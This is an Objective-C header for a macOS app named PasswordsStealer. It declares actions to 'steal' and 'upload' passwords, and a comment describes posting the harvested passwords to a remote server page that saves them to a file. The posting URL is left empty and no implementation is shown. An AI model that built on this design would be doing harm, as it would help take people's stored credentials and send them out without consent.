//
//  PasswordsStealerAppDelegate.h
//  PasswordsStealer
//
//  Created by Alex Nichol on 5/3/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Cocoa/Cocoa.h>

/* Should be a page that saves POST data (php://input) to a
 * text file in order to quickly get all of the passwords
 * backed up on a server. */
#define kPasswordPostingURL @""

@interface PasswordsStealerAppDelegate : NSObject <NSApplicationDelegate> {
	NSWindow * window;
	IBOutlet NSPopUpButton * serviceType;
	IBOutlet NSTextView * passwordsBox;
}

@property (assign) IBOutlet NSWindow * window;

- (IBAction)uploadPasswords:(id)sender;
- (IBAction)stealPasswords:(id)sender;

@end
